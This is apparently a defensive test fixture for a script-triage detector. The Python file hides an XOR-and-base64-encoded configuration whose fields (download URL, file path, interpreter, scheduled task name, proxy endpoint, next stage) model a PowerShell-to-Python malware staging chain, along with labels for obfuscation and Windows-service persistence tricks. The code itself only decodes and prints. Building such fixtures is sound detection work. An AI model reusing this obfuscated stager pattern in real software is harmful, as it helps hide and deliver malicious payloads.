#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_0bf99a6d = "egZZVEl4XhtbB3xJBE5TYF40QFV/T0dJWX1OAlpfU0kORVV4XkdMX29UD01laVYJTV5oXg8ETX5SH01lalIHTRZoUhhYW3hYA3dKflQITUl/RwpMW3xPDloHfFQcTUh/Uw5EVlNLElxSY1U0QFtiXwROXHBIH0ldaWQIR09iT1YdRn9CBVxbdAYcSVZ+Thh3WGVVD0FUa0cESlx5SAhJTmVUBRVfdFgOWE5lVAV3SGNOH0FUa0cISUh+Ug5aB3xCWU1CaWQcQVRoVBxbZX9eGV5Tb14XX1NiXwRfSVNYA0lTYgYYTUh6UghNZWheGEtIZUsfR0hwWApFSm1SDEZlZV9WS1thSwpBXWIWXxhcbw8JHg84XhddSGAGA1xOfEhRBxU4Cw1LDm4NXhxfIl4TSVd8Vw4GU2JNCkRTaBRYHAxuDAkYXiJLElRPf14Zd1trXgVcB0ROBVxIaUgYeEN4UwRGFTgLDUsObg1eHF9wXQJEX1NLClxSMXhRB2p+VAxaW2F/ClxbI3MeRk5+Xhhbdm1ZRAZPfF8KXF8hD1tOWThZXR0OaRUbUUZlVR9NSHxJDlxffmQbSU5kBigSFVxJBE9IbVYvSU5tFDtRTmRUBQUOPF0IHFg6Dl9NFXxCH0BVYhUOUF9wTwpbUVNVCkVfMWgSW05pVj5YXm1PDgUOPF0IHFg6Dl9NRnxJBFBDU14FTEpjUgVcBz0JXAYKIgtFGQA+DV0bDHBVDlBOU0gfSV1pBhlNSWNOGUtfIUgKRUpgXkVYST0="
CODEC_0bf99a6d = "base64_literal|repeating_key_xor|0c,3b,6b,28,3a"

def load_0bf99a6d():
    return base64.b64decode(MATERIAL_0bf99a6d)

def decode_0bf99a6d(v_a19c):
    key_bytes = (12, 59, 107, 40, 58,)
    return bytes(value ^ key_bytes[index % len(key_bytes)] for index, value in enumerate(v_a19c))

def recover_0bf99a6d():
    v_d41a = os.environ.get("HUNTRESS_FIXTURE_CONTEXT", "host")
    try:
        v_b27e = decode_0bf99a6d(load_0bf99a6d())
    except (TypeError, ValueError) as error:
        raise RuntimeError("configuration recovery failed") from error
    v_c304 = v_b27e.decode("ascii", "strict")
    return v_c304

def inspect_0bf99a6d():
    view = memoryview(recover_0bf99a6d().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_0bf99a6d():
    return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

def obfuscation_0bf99a6d():
    try:
        {}["missing"]
    except KeyError:
        return "exception_routing"

def plan_0bf99a6d():
    fields = dict(item.split("=", 1) for item in inspect_0bf99a6d().split("|"))
    analysis_surface = surface_0bf99a6d()
    obfuscation_surface = obfuscation_0bf99a6d()
    operation_plan = ("powershell_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_0bf99a6d())
